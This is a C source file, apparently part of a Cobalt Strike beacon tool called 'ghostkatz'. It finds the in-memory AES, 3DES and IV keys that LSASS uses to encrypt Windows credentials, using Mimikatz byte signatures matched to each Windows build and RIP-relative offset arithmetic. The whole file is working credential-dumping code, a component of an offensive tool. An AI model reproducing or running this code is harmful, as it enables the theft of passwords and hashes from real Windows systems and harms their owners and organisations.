#pragma once
#include <windows.h>
#include <ntstatus.h>

#include "ghostkatz.h"
#include "defs.h"
#include "lsass_offsets.h"

BOOL SearchForCredentialKeys(DWORD dBuildNumber, DWORD64* hAesKeyAddress, DWORD64* h3DesKeyAddress, DWORD64* IVAddress)
{
    unsigned char* credentialKeySig = NULL;
    int KeySigSize = 0;
    int AES_OFFSET = 0;
    int DES_OFFSET = 0;
    int IV_OFFSET = 0;

    //
    // Get the correct Mimikatz byte sequences and offsets based on version
    //
    int arraySize = sizeof(LsassKeyOffsetsArray) / sizeof(LsassKeyOffsetsArray[0]);
    int i = arraySize - 1;
    for (; i >= 0; i--)
    {
        if (dBuildNumber >= LsassKeyOffsetsArray[i].WindowsVersion)
        {
            credentialKeySig = LsassKeyOffsetsArray[i].credentialKeySig;
            KeySigSize = LsassKeyOffsetsArray[i].KeySigSize;
            AES_OFFSET = LsassKeyOffsetsArray[i].AES_OFFSET;
            DES_OFFSET = LsassKeyOffsetsArray[i].DES_OFFSET;
            IV_OFFSET  = LsassKeyOffsetsArray[i].IV_OFFSET;

            break;
        }
    }

    if (credentialKeySig == NULL || KeySigSize == 0 || AES_OFFSET == 0 || DES_OFFSET == 0 || IV_OFFSET == 0)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get correct key offsets for Windows build %lu!\n", dBuildNumber);
        return FALSE;
    }

    //
    // After getting bytes and offsets, we will then check if we can find the pattern
    //
    PBYTE lsasrvImageBase = (PBYTE)GetModuleHandleA("lsasrv.dll");
    if (lsasrvImageBase == NULL)
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to get lsasrv DLL address!");
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lsasrvImageBase;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pDosHdr + pDosHdr->e_lfanew);
    PBYTE lsasrvTextBase = lsasrvImageBase + pNtHdr->OptionalHeader.BaseOfCode;
    DWORD lsasrvTextSize = pNtHdr->OptionalHeader.SizeOfCode;

    //
    // Search for credential keys signature within lsasrv.dll and grab the offset
    //
    DWORD credentialKeySigOffset = SearchPattern(lsasrvTextBase, lsasrvTextSize, credentialKeySig, KeySigSize);
    if (credentialKeySigOffset == 0) {
        BeaconFormatPrintf(&outputbuffer, "Could not find offset to AES/3Des/IV keys");
        return FALSE;
    }

    //
    // If we found the pattern we can proceed with getting the actual address
    //

    /* Get the full address where the mimikatz byte pattern was found */
    PBYTE AesKey_PatternAddress = lsasrvTextBase + credentialKeySigOffset + AES_OFFSET;

    PBYTE DesKey_PatternAddress = lsasrvTextBase + credentialKeySigOffset + DES_OFFSET;

    PBYTE IV_PatternAddress = lsasrvTextBase + credentialKeySigOffset + IV_OFFSET;

    /*
        Now get the RIP offset from the pattern address so we can use it later.
        It may look like  "48 8d 0d 97 f8 01 00    lea rcx,[rip+0x1f897] # 0x1f89e"  and we want to get the 0x1f897
        The mimikatz offsets take us directly to the rip offset value we want to retrieve so we have to read 4 bytes forward and reverse the endianness
    */
    DWORD AesKey_RipOffset =
        (AesKey_PatternAddress[3] << 24) |
        (AesKey_PatternAddress[2] << 16) |
        (AesKey_PatternAddress[1] << 8) |
        (AesKey_PatternAddress[0]);

    DWORD DesKey_RipOffset =
        (DesKey_PatternAddress[3] << 24) |
        (DesKey_PatternAddress[2] << 16) |
        (DesKey_PatternAddress[1] << 8) |
        (DesKey_PatternAddress[0]);

    DWORD IV_RipOffset =
        (IV_PatternAddress[3] << 24) |
        (IV_PatternAddress[2] << 16) |
        (IV_PatternAddress[1] << 8) |
        (IV_PatternAddress[0]);


    /*
        RIP-relative offsets are calculated from the instruction *following* the offset.
        Mimikatz resolves the address 4 bytes too early (pointing directly at the offset),
        so we must add 4 bytes to correct the final address.
    */
    DWORD64 Real_AesKey_Address = AesKey_PatternAddress + AesKey_RipOffset + 4;
    DWORD64 Real_DesKey_Address = DesKey_PatternAddress + DesKey_RipOffset + 4;
    DWORD64 Real_IV_Address = IV_PatternAddress + IV_RipOffset + 4;

    *hAesKeyAddress = Real_AesKey_Address;
    *h3DesKeyAddress = Real_DesKey_Address;
    *IVAddress = Real_IV_Address;

    return TRUE;
}